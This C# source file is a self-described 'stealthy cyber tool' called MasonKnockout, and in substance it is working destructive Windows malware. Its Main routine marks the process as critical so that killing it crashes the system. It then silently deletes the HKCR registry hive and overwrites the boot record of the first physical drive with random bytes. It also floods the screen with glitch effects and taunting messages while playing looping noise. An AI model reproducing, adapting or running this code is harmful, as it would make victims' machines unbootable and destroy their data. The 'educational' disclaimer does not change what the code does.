// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *  
// *                                                           *  
// *  Copyright © 2025 ABOLHB - FREEMASONRY                    *  
// *                                                           *  
// *  Project: MasonKnockout                                   *  
// *  Description: Advanced and stealthy cyber tool            *  
// *                                                           *  
// *  WARNING: This software is strictly for educational       *  
// *  and research purposes only. Any misuse may lead to       *  
// *  serious legal consequences. Use responsibly.             *  
// *                                                           *  
// *  Developed By: ABOLHB                                     *  
// *  Group: FREEMASONRY                                       *  
// *                                                           *  
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *  
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
class MasonClass
{
    private static ulong seed1, seed2;
    private static int RandomGenerator()
    {
        seed1 = seed2;
        seed1 ^= 0x5a8279995a827999;
        seed1 ^= (seed1 << 7) | (seed1 >> 25);
        seed1 *= 0x9e3779b99e3779b9;
        seed2 = seed1;
        return (int)(seed1 & 0x7fffffff);
    }
    [DllImport("msimg32.dll")]
    static extern bool TransparentBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
    IntPtr hdcSrc, int nXSrc, int nYSrc, int dwWidth, int dwHeight,
    int crTransparent);
    [DllImport("gdi32.dll")]
    static extern IntPtr CreateSolidBrush(uint crColor);
    [DllImport("gdi32.dll")]
    static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);
    [DllImport("user32.dll")]
    static extern bool GetWindowRect(IntPtr hWnd, ref RECT rect);
    [DllImport("user32.dll")]
    static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
    [DllImport("gdi32.dll", CharSet = CharSet.Auto)]
    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
    [DllImport("gdi32.dll")]
    private static extern int SetStretchBltMode(IntPtr hdc, int mode);
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
    string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes,
    uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, ref uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("user32.dll")]
    private static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);
    [DllImport("user32.dll")]
    private static extern IntPtr LoadIcon(IntPtr hInstance, IntPtr lpIconName);
    [DllImport("user32.dll")]
    private static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll")]
    private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, uint flags);
    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(int nIndex);
    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateCompatibleDC(IntPtr hdc);
    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateBitmap(int nWidth, int nHeight, uint cPlanes, uint cBitsPerPel, IntPtr lpvBits);
    [DllImport("gdi32.dll")]
    private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
    [DllImport("gdi32.dll")]
    private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
    IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("gdi32.dll")]
    private static extern int GetBitmapBits(IntPtr hBitmap, int cbBuffer, byte[] lpvBits);
    [DllImport("gdi32.dll")]
    private static extern int SetBitmapBits(IntPtr hBitmap, int cbBuffer, byte[] lpvBits);
    [DllImport("gdi32.dll")]
    private static extern bool DeleteObject(IntPtr hObject);
    [DllImport("user32.dll")]
    private static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")]
    private static extern IntPtr GetWindowDC(IntPtr hWnd);
    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(int crColor);
    [DllImport("gdi32.dll")]
    private static extern bool PatBlt(IntPtr hdc, int x, int y, int width, int height, int rop);
    [DllImport("user32.dll")]
    private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    [DllImport("gdi32.dll")]
    private static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int nDestWidth, int nDestHeight,
    IntPtr hdcSrc, int xSrc, int ySrc, int nSrcWidth, int nSrcHeight, uint dwRop);
    private const int SM_CXSCREEN = 0;
    private const int SM_CYSCREEN = 1;
    private const uint PATINVERT = 0x005A0049;
    private const uint SRCCOPY = 0x00CC0020;
    const int SRCAND = 0x008800C6;
    const int SRCPAINT = 0x00EE0086;
    const uint ROP_CODE = 0x987584;
    const int CUSTOM_ROP = unchecked((int)0x1900AC010E);
    private const int SampleRate = 11025;
    private const int DurationSeconds = 10;
    const int FreemasonryMBR = 512;
    private const int HALFTONE = 4;
    private const int BufferSize = SampleRate * DurationSeconds;
    private static readonly IntPtr IDI_ERROR = new IntPtr(0x7F00);
    private static readonly IntPtr IDI_WARNING = new IntPtr(0x7F03);
    private static readonly IntPtr IDI_APPLICATION = new IntPtr(0x7F04);
    private static Func<int, int>[] formulas = new Func<int, int>[] {
        t => 131072>t%262144?t/64>>3&2*t&10*t|t>>5&6*t&(t>>4|t>>5):131072<t%262144&163840>t%262144?t>>4&8*t&(t>>5|t>>4)|3*t&10*t:163840<t%262144&196608>t%262144?
        t>>4&8*t&(t>>5|t>>4)|3*t&6*t:196608<t%262144&229376>t%262144?t>>4&8*t&(t>>5|t>>4)|4*t&6*t:229376<t%262144&245760>t%262144?t>>4&8*t&(t>>5|t>>4)|4*t&2*t:t>>4&8*t&t>>4|(4*t&2*t)>>20
    };
    static Thread Mason1Thread;
    static Thread Mason2Thread;
    static Thread Mason3Thread;
    static Thread Mason4Thread;
    static Thread Mason5Thread;
    static Thread Mason6Thread;
    static Thread Mason7Thread;
    static Thread Mason8Thread;
    static Thread Mason9Thread;
    static Thread Mason10Thread;
    public struct RECT
    {
        public int left;
        public int top;
        public int right;
        public int bottom;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct POINT
    {
        public int x;
        public int y;
    }
    public static Func<int, int>[] Formulas { get => formulas; set => formulas = value; }
    private static void MasonMBR()
    {
        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
        {
            byte[] mbrData = new byte[FreemasonryMBR];
            Random rand = new Random();
            rand.NextBytes(mbrData);
            fs.Write(mbrData, 0, FreemasonryMBR);
        }
    }
    static void MasonRegistryDeleter()
    {
        ProcessStartInfo MasonDeleter = new ProcessStartInfo();
        MasonDeleter.FileName = "cmd.exe";
        MasonDeleter.WindowStyle = ProcessWindowStyle.Hidden;
        MasonDeleter.Arguments = @"/k reg delete HKCR /f";
        Process.Start(MasonDeleter);
    }
    public static void MasonFarewell()
    {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        IntPtr desk = GetDC(IntPtr.Zero);
        IntPtr desktopWindow = GetDesktopWindow();
        IntPtr hdcScreen = GetDC(IntPtr.Zero);
        Random random = new Random();
        int n = 10;
        Graphics graphics = Graphics.FromHdc(desk);
        graphics.TextRenderingHint = TextRenderingHint.AntiAliasGridFit;
        Font font = new Font("Impact", 70, FontStyle.Bold, GraphicsUnit.Point);
        string text = "STICK YOUR COMPUTER IN THE TRASH";
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr hDc = GetWindowDC(desktopWindow);
            BitBlt(hdc, random.Next(sw), random.Next(sh), random.Next(sw), random.Next(sh), hdc, random.Next(sw), random.Next(sh), SRCCOPY);
            BitBlt(hdc, 10, random.Next(sh), sw, 96, hdc, 0, random.Next(sh), CUSTOM_ROP);
            BitBlt(hdc, -10, random.Next(sh), sw, -96, hdc, 0, random.Next(sh), CUSTOM_ROP);
            BitBlt(hdc, random.Next(-1380, 451), random.Next(sh), sw, 600, hdc, 200, random.Next(sh), SRCCOPY);
            BitBlt(hdc, random.Next(sw), random.Next(-1560, 291), 600, sh, hdc, random.Next(sw), 200, SRCCOPY);
            BitBlt(hdc, -2, -2, sw, sh, hdc, 1, 1, SRCCOPY);
            uint color = (uint)(random.Next(256) << 16 | random.Next(256) << 8 | random.Next(256));
            IntPtr brush = CreateSolidBrush(color);
            SelectObject(hdc, brush);
            PatBlt(hdc, 0, 0, sw, sh, (int)PATINVERT);
            DeleteObject(brush);
            StretchBlt(hdcScreen, n, n, sw - n * 2, sh - n * 2, hdcScreen, 0, 0, sw, sh, SRCCOPY);
            SetStretchBltMode(hdcScreen, HALFTONE);
            StretchBlt(hdcScreen, 0, 0, sw + 1, sh - 1, hdcScreen, 0, 0, sw, sh, SRCCOPY);
            StretchBlt(hdcScreen, 0, 0, sw - 1, sh + 1, hdcScreen, 0, 0, sw, sh, SRCCOPY);
            float x = random.Next(sw - 400);
            float y = random.Next(sh - 100);
            Brush textBrush = new SolidBrush(Color.FromArgb(random.Next(256), random.Next(256), random.Next(256)));
            graphics.DrawString(text, font, textBrush, x, y);
            DrawIcon(hDc, random.Next(sw), random.Next(sh), LoadIcon(IntPtr.Zero, IDI_ERROR));
            DrawIcon(hDc, random.Next(sw), random.Next(sh), LoadIcon(IntPtr.Zero, IDI_WARNING));
            DrawIcon(hDc, random.Next(sw), random.Next(sh), LoadIcon(IntPtr.Zero, IDI_APPLICATION));
            Pen pen = new Pen(Color.FromArgb(random.Next(256), random.Next(256), random.Next(256)), random.Next(1, 10));
            graphics.DrawLine(pen, random.Next(sw), random.Next(sh), random.Next(sw), random.Next(sh));
            graphics.DrawEllipse(pen, random.Next(sw), random.Next(sh), random.Next(100, 300), random.Next(100, 300));
            graphics.DrawRectangle(pen, random.Next(sw), random.Next(sh), random.Next(100, 300), random.Next(100, 300));
            int rop = random.Next(2) == 0 ? SRCAND : SRCPAINT;
            BitBlt(hdcScreen, random.Next(2), random.Next(2), sw, sh, hdcScreen, random.Next(2), random.Next(2), rop);
            if (n < sw) n += 12;
            if (n > sw) n = 4;
        }
    }
    public static void MasonRandomly()
    {
        Random rand = new Random();
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        IntPtr desk = GetDC(IntPtr.Zero);
        Graphics graphics = Graphics.FromHdc(desk);
        graphics.TextRenderingHint = TextRenderingHint.AntiAliasGridFit;
        Font font = new Font("Impact", 70, FontStyle.Bold, GraphicsUnit.Point);
        string text = "YOUR DEVICE SMOKES WEED";
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int x = rand.Next(screenWidth - 400);
            int y = rand.Next(screenHeight - 100);
            Color randomColor = Color.FromArgb(rand.Next(256), rand.Next(256), rand.Next(256));
            Brush brush = new SolidBrush(randomColor);
            graphics.DrawString(text, font, brush, x, y);
            Point[] triangle = new Point[]
            {
                new Point(rand.Next(screenWidth), rand.Next(screenHeight)),
                new Point(rand.Next(screenWidth), rand.Next(screenHeight)),
                new Point(rand.Next(screenWidth), rand.Next(screenHeight))
            };
            graphics.FillPolygon(brush, triangle);
            Pen pen = new Pen(randomColor, 3);
            for (int i = 0; i < 5; i++)
            {
                graphics.DrawLine(pen, rand.Next(screenWidth), rand.Next(screenHeight),
                                       rand.Next(screenWidth), rand.Next(screenHeight));
            }
            for (int i = 0; i < 3; i++)
            {
                graphics.DrawEllipse(pen, rand.Next(screenWidth), rand.Next(screenHeight),
                                     rand.Next(100, 300), rand.Next(100, 300));
            }
            BitBlt(hdc, 0, 10, screenWidth, screenHeight, hdc, 0, -10, ROP_CODE);
            BitBlt(hdc, 0, -10, screenWidth, screenHeight, hdc, 0, 10, ROP_CODE);
            BitBlt(hdc, 10, 0, screenWidth, screenHeight, hdc, -10, 0, ROP_CODE);
            BitBlt(hdc, -10, 0, screenWidth, screenHeight, hdc, 10, 0, ROP_CODE);
            ReleaseDC(IntPtr.Zero, hdc);
        }
    }
    private static byte[] MasonGenerateBuffer(Func<int, int> formula)
    {
        byte[] buffer = new byte[BufferSize];
        for (int t = 0; t < BufferSize; t++)
        {
            buffer[t] = (byte)(formula(t) & 0xFF);
        }
        return buffer;
    }
    private static void MasonSaveWav(byte[] buffer, string filePath)
    {
        using (var fs = new FileStream(filePath, FileMode.Create))
        using (var bw = new BinaryWriter(fs))
        {
            bw.Write(new[] { 'R', 'I', 'F', 'F' });
            bw.Write(36 + buffer.Length);
            bw.Write(new[] { 'W', 'A', 'V', 'E' });
            bw.Write(new[] { 'f', 'm', 't', ' ' });
            bw.Write(16);
            bw.Write((short)1);
            bw.Write((short)1);
            bw.Write(SampleRate);
            bw.Write(SampleRate);
            bw.Write((short)1);
            bw.Write((short)8);
            bw.Write(new[] { 'd', 'a', 't', 'a' });
            bw.Write(buffer.Length);
            bw.Write(buffer);
        }
    }
    private static void MasonPlayBufferLoop(byte[] buffer)
    {
        string tempFilePath = Path.GetTempFileName();
        MasonSaveWav(buffer, tempFilePath);
        using (SoundPlayer player = new SoundPlayer(tempFilePath))
        {
            player.PlayLooping();
            Thread.Sleep(Timeout.Infinite);
        }
        File.Delete(tempFilePath);
    }
    public static void MasonByteBeat()
    {
        foreach (var formula in Formulas)
        {
            byte[] buffer = MasonGenerateBuffer(formula);
            MasonPlayBufferLoop(buffer);
        }
    }
    public static void MasonRepetition()
    {
        IntPtr hdc = GetDC(IntPtr.Zero);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        while (true)
        {
            hdc = GetDC(IntPtr.Zero);
            BitBlt(hdc, -2, -2, sw, sh, hdc, 1, 1, SRCCOPY);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(100);
        }
    }
    public static void MasonScribble()
    {
        IntPtr desk = GetDC(IntPtr.Zero);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        RECT rekt = new RECT();
        POINT[] wPt = new POINT[3];
        while (true)
        {
            GetWindowRect(GetDesktopWindow(), ref rekt);
            Random rand = new Random();
            wPt[0].x = rand.Next(sw); wPt[0].y = rand.Next(sh);
            wPt[1].x = rand.Next(sw); wPt[1].y = rand.Next(sh);
            wPt[2].x = rand.Next(sw); wPt[2].y = rand.Next(sh);

            PlgBlt(desk, wPt, desk, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, IntPtr.Zero, 0, 0);
        }
    }
    public static void MasonGetdown()
    {
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        Random rand = new Random();
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            uint color = (uint)(rand.Next(256) << 16 | rand.Next(256) << 8 | rand.Next(256));
            IntPtr brush = CreateSolidBrush(color);
            IntPtr oldBrush = SelectObject(hdc, brush);
            BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
            BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
            BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
            BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
            SelectObject(hdc, oldBrush);
            DeleteObject(brush);
            ReleaseDC(IntPtr.Zero, hdc);
        }
    }
    public static void MasonGlitch()
    {
        int screenW = GetSystemMetrics(0);
        int screenH = GetSystemMetrics(1);
        Random random = new Random();
        IntPtr desktopHdc = GetDC(IntPtr.Zero);
        while (true)
        {
            desktopHdc = GetDC(IntPtr.Zero);
            BitBlt(desktopHdc, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), desktopHdc, random.Next(screenW), random.Next(screenH), SRCCOPY);
            SelectObject(desktopHdc, CreateSolidBrush((uint)(random.Next(255) << 16 | random.Next(255) << 8 | random.Next(255))));
            int ry = random.Next(screenH);
            BitBlt(desktopHdc, 10, ry, screenW, 96, desktopHdc, 0, ry, CUSTOM_ROP);
            BitBlt(desktopHdc, -10, ry, screenW, -96, desktopHdc, 0, ry, CUSTOM_ROP);
            IntPtr brush = CreateSolidBrush((uint)(random.Next(255) << 16 | random.Next(255) << 8 | random.Next(255)));
            SelectObject(desktopHdc, brush);
            int x = random.Next(10, screenW - 600);
            int y = random.Next(20, screenH - 600);
            BitBlt(desktopHdc, random.Next(-1380, 451), y, screenW, 600, desktopHdc, 200, y, SRCCOPY);
            BitBlt(desktopHdc, x, random.Next(-1560, 291), 600, screenH, desktopHdc, x, 200, SRCCOPY);
            DeleteObject(brush);
            ReleaseDC(IntPtr.Zero, desktopHdc);
        }
    }
    private static void MasonConfusion()
    {
        int startTime = Environment.TickCount;
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        byte[] pixelData = new byte[(screenWidth * screenHeight + screenWidth) * 4];
        for (int i = 0; ; i++, i %= 4)
        {
            if (i == 0)
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133);
            IntPtr desktop = GetDC(IntPtr.Zero);
            IntPtr memoryDC = CreateCompatibleDC(desktop);
            IntPtr bitmap = CreateBitmap(screenWidth, screenHeight, 1, 32, IntPtr.Zero);
            SelectObject(memoryDC, bitmap);
            BitBlt(memoryDC, 0, 0, screenWidth, screenHeight, desktop, 0, 0, 0x330008);
            GetBitmapBits(bitmap, screenWidth * screenHeight * 4, pixelData);
            int offset = 0;
            byte randomByte = 0;
            if ((Environment.TickCount - startTime) > 60000)
                randomByte = (byte)(RandomGenerator() % 0xff);
            for (int j = 0; j < screenWidth * screenHeight; j++)
            {
                if (j % screenHeight == 0 && RandomGenerator() % 100 == 0)
                    offset = RandomGenerator() % 50;
                pixelData[j * 4 + (offset % 4)] += (byte)(pixelData[(j + offset) * 4] ^ randomByte);
            }
            SetBitmapBits(bitmap, screenWidth * screenHeight * 4, pixelData);
            BitBlt(desktop, RandomGenerator() % 4 - 2, RandomGenerator() % 4 - 2, screenWidth, screenHeight, memoryDC, 0, 0, SRCCOPY);
            DeleteObject(bitmap);
            DeleteObject(memoryDC);
            DeleteObject(desktop);
        }
    }
    public static void MasonMelting()
    {
        Random random = new Random();
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(SM_CXSCREEN);
            int h = GetSystemMetrics(SM_CYSCREEN);
            int rx = random.Next(w);
            BitBlt(hdc, rx, 10, 100, h, hdc, rx, 0, SRCCOPY);
            ReleaseDC(IntPtr.Zero, hdc);
        }
    }
    public static void MasonColors()
    {
        IntPtr hdc = GetDC(IntPtr.Zero);
        int X = GetSystemMetrics(SM_CXSCREEN);
        int Y = GetSystemMetrics(SM_CYSCREEN);
        Random rand = new Random();
        while (true)
        {
            hdc = GetDC(IntPtr.Zero);
            X = GetSystemMetrics(SM_CXSCREEN);
            Y = GetSystemMetrics(SM_CYSCREEN);
            uint color = (uint)(rand.Next(256) << 16 | rand.Next(256) << 8 | rand.Next(256));
            IntPtr brush = CreateSolidBrush(color);
            SelectObject(hdc, brush);
            BitBlt(hdc, rand.Next(X), rand.Next(Y), rand.Next(X), rand.Next(Y), hdc, rand.Next(X), rand.Next(Y), PATINVERT);
            DeleteObject(brush);
            ReleaseDC(IntPtr.Zero, hdc);
        }
    }
    public static void MasonMess()
    {
        IntPtr wnd = GetDesktopWindow();
        IntPtr hdcScreen = GetDC(IntPtr.Zero);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        Random rand = new Random();
        int TransparentBltColor = RGB(rand.Next(256), rand.Next(256), rand.Next(256));
        Thread transparentThread = new Thread(() =>
        {
            while (true)
            {
                for (int i = 0; i < 100; i++)
                {
                    TransparentBlt(hdcScreen, rand.Next(sw), rand.Next(sh), sw, sh,
                                   hdcScreen, rand.Next(sw), rand.Next(sh),
                                   rand.Next(1, 255), rand.Next(1, 255),
                                   TransparentBltColor);
                }
            }
        });
        transparentThread.Start();
        Thread.Sleep(Timeout.Infinite);
    }
    static void MasonGDI()
    {
        while (true)
        {
            Mason1Thread = new Thread(MasonFarewell);
            Mason1Thread.IsBackground = true;
            Mason1Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason2Thread = new Thread(MasonRandomly);
            Mason2Thread.IsBackground = true;
            Mason2Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason3Thread = new Thread(MasonRepetition);
            Mason3Thread.IsBackground = true;
            Mason3Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason4Thread = new Thread(MasonScribble);
            Mason4Thread.IsBackground = true;
            Mason4Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason5Thread = new Thread(MasonGetdown);
            Mason5Thread.IsBackground = true;
            Mason5Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason6Thread = new Thread(MasonGlitch);
            Mason6Thread.IsBackground = true;
            Mason6Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason7Thread = new Thread(MasonMelting);
            Mason7Thread.IsBackground = true;
            Mason7Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason8Thread = new Thread(MasonConfusion);
            Mason8Thread.IsBackground = true;
            Mason8Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason9Thread = new Thread(MasonColors);
            Mason9Thread.IsBackground = true;
            Mason9Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason10Thread = new Thread(MasonMess);
            Mason10Thread.IsBackground = true;
            Mason10Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
        }
    }
    static void MasonClear()
    {
        for (int num = 0; num < 10; num++)
        {
            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
        }
    }
    static int RGB(int r, int g, int b)
    {
        return (b << 16) | (g << 8) | r;
    }
    static void Main(string[] args)
    {
        int isCritical = 1;
        int BreakOnTermination = 0x1D;
        Process.EnterDebugMode();
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        Task.Factory.StartNew(() => MasonRegistryDeleter());
        Task.Factory.StartNew(() => MasonByteBeat());
        Task.Factory.StartNew(() => MasonMBR());
        Task.Run(() => MasonGDI());
        Thread.Sleep(Timeout.Infinite);
    }
}